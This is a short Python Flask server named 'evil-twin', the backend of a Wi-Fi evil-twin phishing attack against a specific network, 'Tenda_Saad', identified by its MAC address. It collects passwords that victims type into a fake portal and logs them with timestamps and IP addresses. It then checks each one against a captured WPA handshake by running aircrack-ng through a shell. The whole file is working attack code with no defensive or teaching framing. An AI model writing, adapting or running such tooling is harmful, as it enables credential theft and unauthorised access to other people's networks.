from flask import Flask, request, jsonify
from subprocess import run, PIPE
import time, os
from datetime import datetime

target = 'CC:2D:21:61:71:58'
ssid_name = 'Tenda_Saad'
handshake_file = 'Tenda_Saad.cap'

if len(target) != 17:
    print('[ERROR] Invalid target MAC address format')
    exit(1)
if not os.path.exists(handshake_file):
    print(f'[ERROR] {handshake_file} not found in {os.getcwd()}')
    exit(1)

app = Flask('evil-twin')

logpass = open('attempts.txt', 'a')
print('[INFO] All attempts will be saved in attempts.txt with timestamps and SSID info')

def checkWPA(passw):
    wrdl = open('password.txt', 'w')
    print(passw, file=wrdl)
    wrdl.close()
    cmd = f"aircrack-ng {handshake_file} -b '{target}' -w password.txt"
    out = run(cmd, stdout=PIPE, shell=True)
    output = out.stdout
    code = out.returncode
    
    if "KEY NOT FOUND" in str(output):
        return False
    elif "KEY FOUND" in str(output):
        return True
    elif "ERROR" in str(output): 
        return False
    else: 
        return None

@app.before_request
def log_request():
    app.logger.debug("Request Headers %s", request.headers)
    return None

@app.route("/pass", methods=['POST'])
def hello_world():
    passw = request.form["pass"]
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    client_ip = request.remote_addr
    
    log_entry = f"{timestamp} | SSID: {ssid_name} | Password: {passw} | IP: {client_ip}"
    print(log_entry, file=logpass)
    logpass.flush()
    
    results = checkWPA(passw)
    
    if results:
        response = jsonify(status="All good")
        response.headers.add("Access-Control-Allow-Origin", "*")
        return response
    else:
        response = jsonify(status="notgood")
        response.headers.add("Access-Control-Allow-Origin", "*")
        return response

@app.after_request
def after(response):
    print(response.status)
    print(response.get_data())
    return response

app.run(host="0.0.0.0")